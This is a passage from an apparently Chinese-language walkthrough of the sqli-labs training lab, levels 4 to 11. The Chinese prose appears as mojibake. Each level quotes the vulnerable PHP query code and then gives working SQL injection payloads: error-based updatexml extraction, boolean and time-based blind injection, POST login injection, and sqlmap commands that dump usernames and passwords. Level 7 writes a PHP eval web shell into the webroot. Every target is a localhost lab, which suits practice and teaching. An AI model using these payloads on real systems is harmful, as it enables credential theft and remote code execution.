<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>&quot;)</code>é—­åˆ</p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbs --batch</code></p>
<br>

<h3 id="5-æŠ¥é”™æ³¨å…¥"><a href="#5-æŠ¥é”™æ³¨å…¥" class="headerlink" title="5.æŠ¥é”™æ³¨å…¥"></a>5.æŠ¥é”™æ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>id=1&#39; --+</code>é¡µé¢æ­£å¸¸ è¯´æ˜ç”¨ <code>&#39;</code>é—­åˆ</p>
<p><code>id=1&#39;  and 1=1 --+</code> æœ‰å›æ˜¾</p>
<p><code>id=1&#39;  and 1=2 --+</code>æ— å›æ˜¾</p>
<p>æŸ¥çœ‹ä»£ç ï¼Œå‘ç°åªè¦è¯­å¥æ‰§è¡ŒæˆåŠŸå°±ä¼šè¿”å›â€™You are in â€¦â€¦..â€™</p>
<p>å¯ä»¥è€ƒè™‘ä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–è€…å¸ƒå°”ç›²æ³¨</p>
<p>æŠ¥é”™æ³¨å…¥ä½¿ç”¨<code>updatexml</code></p>
<p><code>id=1&#39;  and updatexml(1,concat(0x7e,(select concat_ws(&#39;:&#39;,database(),version(),user()))),1)--+</code>==&gt; <code>XPATH syntax error: &#39;~security:5.7.26:root@localhost&#39;</code>å¾—åˆ°æ•°æ®åº“ç­‰ä¿¡æ¯</p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),0x7e),1)--+</code>å¾—åˆ°è¡¨å==&gt; <code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)--+</code>å¾—åˆ°å­—æ®µå==&gt;<code> XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</code>æŸ¥è´¦å·å¯†ç </p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;</code>  #åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  --dbs</code>   #è·å–æ•°æ®åº“ä¿¡æ¯</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security --tables</code> #è·å–è¡¨å</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users --columns</code>#è·å–å­—æ®µå</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users -C username,password --dump</code> #è·å–è´¦å·å¯†ç </p>
<br>

<br>

<h3 id="6-æŠ¥é”™æ³¨å…¥"><a href="#6-æŠ¥é”™æ³¨å…¥" class="headerlink" title="6.æŠ¥é”™æ³¨å…¥"></a>6.æŠ¥é”™æ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>&quot;</code>é—­åˆ</p>
<p>æ˜¾é”™æ³¨å…¥</p>
<p><code>id=1&quot; --+</code></p>
<p><code>id=1&quot; and 1=1 --+</code></p>
<p><code>id=1&quot; and 1=2 --+</code></p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select database()),0x7e)),1) --+</code> æŸ¥æ•°æ®åº“å ==&gt;<code>XPATH syntax error: &#39;~security~&#39;</code></p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)),1) --+</code> æŸ¥è¡¨å</p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e)),1) --+</code> æŸ¥å­—æ®µ</p>
<br>

<h3 id="7-æ–‡ä»¶å†™å…¥"><a href="#7-æ–‡ä»¶å†™å…¥" class="headerlink" title="7.æ–‡ä»¶å†™å…¥"></a>7.æ–‡ä»¶å†™å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æç¤ºè¦æˆ‘ä»¬å†™å…¥æ–‡ä»¶</p>
<p>å†™å…¥ä¸€å¥è¯çš„æ¡ä»¶</p>
<blockquote>
<p>æœ‰æ•°æ®åº“çš„å†™å…¥æƒé™</p>
<p>çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p>
<br>
</blockquote>
<p>åœ¨åšå†™å…¥ç»ƒä¹ æ—¶ï¼Œéœ€è¦ç”¨åˆ°<code>into outfile</code> ,ä½†æ‰§è¡Œåå´æ— æ³•ç”Ÿæˆå†™å…¥æ–‡ä»¶</p>
<p>è§£å†³æ–¹æ¡ˆ</p>
<blockquote>
<p>åœ¨MYSQLå‘½ä»¤è¡Œè¾“å…¥ <code>show variables like &#39;%secure%&#39;;</code>æŸ¥çœ‹<code> secure-file-priv</code>çš„å€¼</p>
<p>å‘ç°<code>secure_file_priv</code>å€¼ä¸º<code>NULL</code></p>
<p>åœ¨my.iniä¸­ä¿®æ”¹æˆ–æ·»åŠ <code>secure_file_priv=&quot;/&quot;</code>ç„¶åæŠ¥å­˜å¹¶é‡å¯æ•°æ®åº“ </p>
<p>è¿è¡Œ<code>http://127.0.0.1/sqli-labs/Less-7/?id=-1%27))%20union%20select%201,2,3%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.txt%22%20--+</code>æˆåŠŸç”Ÿäº§å†™å…¥æ–‡ä»¶</p>
</blockquote>
<br>

<p>æ ¹æ®ä»£ç è¿›è¡Œé—­åˆ<code>id=1&#39;)) --+</code></p>
<p><code>id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code> ä¸æŠ¥é”™è¯´æ˜æ˜¯rootæƒé™</p>
<p>é€šè¿‡å‰é¢çš„å…³å¡å¾—åˆ°å†³å®šè·¯å¾„</p>
<p><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,@@basedir,@@datadir --+</code>==&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your Login name:D:\phpstudy_pro\Extensions\MySQL5.7.26\</span><br><span class="line">Your Password:D:\phpstudy_pro\Extensions\MySQL5.7.26\data\</span><br></pre></td></tr></table></figure>

<br>

<p>?id=-1â€™)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile â€œD:\phpstudy_pro\WWW\sqli-labs\Less-7â€â€“+</p>
<p><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.php&quot;--+</code></p>
<p>ä½¿ç”¨èœåˆ€è¿æ¥</p>
<br>

<h3 id="8-å¸ƒå°”ç›²æ³¨"><a href="#8-å¸ƒå°”ç›²æ³¨" class="headerlink" title="8.å¸ƒå°”ç›²æ³¨"></a>8.å¸ƒå°”ç›²æ³¨</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸ç¬¬äº”å…³ç›¸æ¯”,æŠŠéƒ¨åˆ†ä»£ç è¿›è¡Œäº†æ³¨é‡Šï¼Œæ— æ³•ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œå¯ä»¥è€ƒè™‘å¸ƒå°”ç›²æ³¨æˆ–è€…æ—¶é—´ç›²æ³¨.</p>
<p><code>?id=1&#39; and 1=1 --+</code> æœ‰å›æ˜¾ â€™you are inâ€™</p>
<p><code>?id=1&#39; and 1=2 --+</code>æ— å›æ˜¾</p>
<p>å¯ä»¥åˆ¤æ–­æ˜¯å¸ƒå°”ç›²æ³¨</p>
<ul>
<li>åˆ¤æ–­Mysqlæ•°æ®åº“æ˜¯å¦æ˜¯åœ¨5.0ä»¥ä¸Š</li>
</ul>
<p><code>?id=1&#39; and mid(version(),1,1)=5 --+</code>æœ‰å›æ˜¾  æˆ–</p>
<p><code>?id=1&#39; and left(version(),1)=&#39;5&#39; --+</code>æœ‰å›æ˜¾</p>
<p><code>?id=1&#39; and left(version(),6)=&#39;5.7.26&#39; --+</code> æœ‰å›æ˜¾åˆ¤æ–­å‡ºæ•°æ®åº“ç‰ˆæœ¬ä¸º<code>5.7.26</code></p>
<ul>
<li>åˆ¤æ–­å½“å‰æ•°æ®åº“é•¿åº¦</li>
</ul>
<p><code>?id=1&#39; and length(database())&gt;7 --+</code></p>
<p><code>?id=1&#39; and length(database())=8 --+</code></p>
<ul>
<li>æˆªå–æ•°æ®åº“ç¬¬ä¸€ä½asciiå¹¶åˆ¤æ–­å€¼</li>
</ul>
<p><code>?id=1&#39; and (ord(mid(database(),1,1)))&gt;114 --+</code></p>
<p><code>?id=1&#39; and (ord(mid(database(),1,1)))=115 --+</code></p>
<p>æˆ–è€…</p>
<p><code>?id=1&#39; and left(database(),1)&gt;&#39;n&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),1)=&#39;s&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),2)=&#39;se&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),3)=&#39;sec&#39; --+</code></p>
<p>ä¾æ¬¡å¾—åˆ°åé¢7ä½ ==&gt;æ•°æ®åº“åä¸ºsecurity</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid(database(),1,1)))=</span></span><br><span class="line"><span class="string">115 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ord(mid((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">2</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid((select </span></span><br><span class="line"><span class="string">database()) ,3,1))) = 99 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">4</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">117</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,5,1))) = 114 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">6</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">105</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,7,1))) = 116 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">8</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">121</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<br>

<p>è·å–æ•°æ®åº“ç¬¬ä¸€å¼ è¡¨çš„é•¿åº¦(æ³¨:è¿™é‡Œlength()é‡Œé¢è¦å†åŠ ä¸€ä¸ªæ‹¬å· )</p>
<p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 --+</code></p>
<p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</code></p>
<p>ä¹Ÿå¯ä»¥è¿™æ ·å†™</p>
<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;5 --+</code> æœ€ç»ˆå¾—åˆ°é•¿åº¦ä¸º6</p>
<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit X,1)&gt;5 --+</code> åˆ¤æ–­ç¬¬Xå¼ è¡¨çš„é•¿åº¦</p>
<br>

<ul>
<li>åˆ¤æ–­è¡¨çš„ç¬¬Nä¸ªå­—ç¬¦ æˆªå–ç¬¬Nä½çš„ASCIIç è¿›è¡Œåˆ¤æ–­,åˆ©ç”¨<code>ord()</code> å’Œ <code>mid(***,1,1)</code>æˆ–è€…<code>substr(***,1,1)</code></li>
</ul>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101  --+</code>åˆ¤æ–­securityåº“ä¸­çš„ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªasciiå€¼ä¸º101 å³<code>e</code></p>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),2,1))=109  --+</code> ç¬¬äºŒä½ä½<code>m</code>    ==&gt;æœ€ç»ˆå¾—åˆ°ç¬¬ä¸€å¼ è¡¨åä¸º<code>emails</code></p>
<p>ç¬¬Xå¼ è¡¨çš„ç¬¬Nä½ASCIIç å€¼åˆ¤æ–­</p>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit X-1,1),N,1))=101  --+</code></p>
<p>ä¹Ÿå¯ä»¥åˆ©ç”¨<code>regexp</code>æ³¨å…¥è·å–<code>users</code>è¡¨ä¸­çš„åˆ—</p>
<p><code>http://127.0.0.1/sql/Less-8/?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us&#39; limit 0,1)--+</code></p>
<br>

<p>ä½¿ç”¨SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbs --technique B --batch</code></p>
<blockquote>
<p>å‚æ•°ï¼šâ€“technique</p>
<p>è¿™ä¸ªå‚æ•°å¯ä»¥æŒ‡å®šsqlmapä½¿ç”¨çš„æ¢æµ‹æŠ€æœ¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šæµ‹è¯•æ‰€æœ‰çš„æ–¹å¼ã€‚</p>
<p>æ”¯æŒçš„æ¢æµ‹æ–¹å¼å¦‚ä¸‹ï¼š</p>
<p>B: Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰<br>E: Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰<br>U: UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰<br>S: Stacked queries SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰<br>T: Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</p>
</blockquote>
<br>

<h3 id="9-æ—¶é—´ç›²æ³¨"><a href="#9-æ—¶é—´ç›²æ³¨" class="headerlink" title="9.æ—¶é—´ç›²æ³¨"></a>9.æ—¶é—´ç›²æ³¨</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>æ— è®ºè¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œéƒ½ä¼šè¿”å›åŒæ ·çš„å›æ˜¾ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡æ—¶é—´ç›²æ³¨çŒœè§£æ•°æ®</p>
<p><code>?id=1&#39; and sleep(3) --+</code>å°è¯•<code>&#39;```&quot;</code>ç­‰é—­åˆæ–¹å¼ï¼Œæ ¹æ®<code>sleep</code>ç¡®è®¤æ˜¯å¦é—­åˆ</p>
<p><code>?id=1&#39; and if(mid(version(),1,1)=5,sleep(5),1) --+</code>åˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬</p>
<p><code>?id=1&#39; and if(length(database()=8),sleep(5),1) --+</code>åˆ¤æ–­æ•°æ®åº“é•¿åº¦</p>
<p><code>?id=1&#39; and if(ascii(mid(database(),1,1))=115,sleep(5),1) --+</code> åˆ¤æ–­æ•°æ®åº“å</p>
<p><code>?id=1&#39; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;3,sleep(5),1) --+</code>åˆ¤æ–­è¡¨é•¿åº¦(length()é‡Œé¢çš„éœ€è¦åŠ <code>()</code>)</p>
<p>ä½¿ç”¨SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-9/?id=1 --dbs --technique T --batch</code></p>
<br>

<h3 id="10-æ—¶é—´ç›²æ³¨"><a href="#10-æ—¶é—´ç›²æ³¨" class="headerlink" title="10.æ—¶é—´ç›²æ³¨"></a>10.æ—¶é—´ç›²æ³¨</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>å’Œç¬¬ä¹å…³ä¸€æ ·ï¼Œä¸è¿‡æ˜¯åŒå¼•å·é—­åˆ</p>
<p><code>?id=1&quot; and sleep(5)--+</code></p>
<br>

<h3 id="11-POSTæ³¨å…¥"><a href="#11-POSTæ³¨å…¥" class="headerlink" title="11.POSTæ³¨å…¥"></a>11.POSTæ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> @$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);  </span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line"> 		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in\n\n &quot; ;</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>

<p><code>uname=admin&#39; and 1=1  --  &amp; passwd=admin</code>æˆ–è€…<code>uname=admin&#39; and 1=1 #  &amp; passwd=admin</code> <code>--+</code>ä¼šæŠ¥é”™</p>
<p><code>uname=admin&#39; order by 2  --   &amp; passwd=admin</code>åˆ¤æ–­å­—æ®µæ•°</p>
<p><code>uname=-1&#39; and 1=1 union select 1,2 --    &amp; passwd=admin</code> æ‰¾å›æ˜¾ç‚¹</p>
